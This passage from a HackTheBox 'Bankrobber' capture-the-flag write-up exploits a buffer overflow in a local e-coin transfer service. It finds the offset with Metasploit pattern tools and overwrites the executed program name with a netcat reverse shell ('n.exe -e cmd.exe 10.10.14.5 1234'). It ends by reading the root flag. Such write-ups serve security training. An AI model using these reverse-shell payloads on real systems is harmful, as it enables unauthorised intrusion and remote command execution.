 [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAA
 [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAA using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaAAAAAA

 [$] Transaction in progress, you can safely disconnect...
                                                           
```

When I enter a long string, I notice something weird:

It seems to overflow the name of the executable that’s running. The name of the executable must be stored on the stack, and this overflow is overwriting it. I’ll examine the binary in [Beyond Root](https://0xdf.gitlab.io/2020/03/07/htb-bankrobber.html#bankv2exe). I can use `msf-pattern_create` to get a pattern and submit it as the amount:

```bash
msf-pattern_create -l 40
```

```txt
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Bankrobber]
└─$ msf-pattern_create -l 40
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A

┌──(kali㉿kali)-[~/Desktop/HackTheBox/Bankrobber]
└─$ nc localhost 910
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A
 [$] Transfering $Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: 0Ab1Ab2A

 [$] Transaction in progress, you can safely disconnect...

```

Now I can submit the first four bytes to `msf-pattern_offset` and get the offset:
`
```bash
msf-pattern_offset -q 0Ab1
```

```txt
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Bankrobber]
└─$ msf-pattern_offset -q 0Ab1    
[*] Exact match at offset 32
```

I already have `nc` located at `\Users\Cortin\AppData\Local\Temp\n.exe`. I’ll try to overwrite the call with that. I’ll create a payload:

```bash
python -c 'print "A"*32 + "\\Users\\Cortin\\AppData\\Local\\Temp\\n.exe -e cmd.exe 10.10.14.5 1234"'
```

```payload
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe 10.10.14.5 1234
```

Now, with a `nc` listening waiting, I’ll submit it:

```bash
nc -lvp 1234
```

```bash
nc localhost 910
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe 10.10.14.5 1234
```

```txt
┌──(kali㉿kali)-[~/Desktop/HackTheBox/Bankrobber]
└─$ nc localhost 910                                                                                
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio & Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe 10.10.14.5 1234
 [$] Transfering $AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe 10.10.14.5 1234 using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: \Users\Cortin\AppData\Local\Temp\n.exe -e cmd.exe 10.10.14.5 1234

 [$] Transaction in progress, you can safely disconnect...

```

Excellent! we will get the root shell.

```cmd
whoami
type C:\Users\admin\Desktop\root.txt
```

```bash
# root flag
aa65d8e6216585ea636eb07d4a59b197
```

![[Bankrobber-33.png]]


